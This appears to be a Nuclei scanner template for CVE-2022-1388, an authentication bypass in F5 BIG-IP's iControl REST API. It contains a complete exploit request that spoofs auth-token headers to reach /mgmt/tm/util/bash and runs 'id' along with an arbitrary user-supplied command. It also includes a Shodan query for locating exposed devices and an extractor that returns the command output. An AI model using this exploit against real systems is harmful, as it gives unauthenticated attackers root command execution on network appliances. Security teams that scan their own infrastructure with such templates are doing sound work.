id: CVE-2022-1388
info:
  author: Mrcl0wn
  classification:
    cve-id: CVE-2022-1388
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
  description: "CVE-2022-1388 is an authentication bypass vulnerability in the REST\
    \ \ncomponent of BIG-IP\u2019s iControl API that was assigned a CVSSv3 \nscore\
    \ of 9.8. The iControl REST API is used for the management and \nconfiguration\
    \ of BIG-IP devices. CVE-2022-1388 could be exploited \nby an unauthenticated\
    \ attacker with network access to the management \nport or self IP addresses of\
    \ devices that use BIG-IP. Exploitation would \nallow the attacker to execute\
    \ arbitrary system commands, create and \ndelete files and disable services.\n"
  metadata:
    shodan-query: http.title:"BIG-IP&reg;-+Redirect" +"Server"
    verified: true
  name: F5 BIG-IP iControl REST Auth Bypass RCE | Command Parameter
  reference:
  - https://github.com/alt3kx/CVE-2022-1388_PoC
  - https://support.f5.com/csp/article/K23605346
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388
  - https://github.com/dorkerdevil/CVE-2021-22986-Poc/blob/main/README.md
  - https://github.com/horizon3ai/CVE-2022-1388/blob/main/CVE-2022-1388.py
  - https://www.tenable.com/blog/cve-2022-1388-authentication-bypass-in-f5-big-ip
  - https://github.com/numanturle/CVE-2022-1388/blob/main/bigip-icontrol-rest-rce.yaml
  severity: critical
  tags: bigip,mirai,rce,cve,cve2022
requests:
- extractors:
  - group: 1
    name: result_command
    part: body
    regex:
    - '"commandResult":"(.*)"'
    type: regex
  matchers:
  - type: word
    words:
    - commandResult
    - uid=
    - '{{cmd_var}}'
  - condition: and
    status:
    - 200
    type: status
  raw:
  - "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nConnection: keep-alive,\
    \ X-F5-Auth-Token\nX-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth_var)}}\n\
    Content-Type: application/json\n\n{\n  \"command\": \"run\",\n  \"utilCmdArgs\"\
    : \"-c 'id;cmd_var'\"\n}\n"
variables:
  auth_var: 'admin:'
  cmd_var: '{{CMD}}'
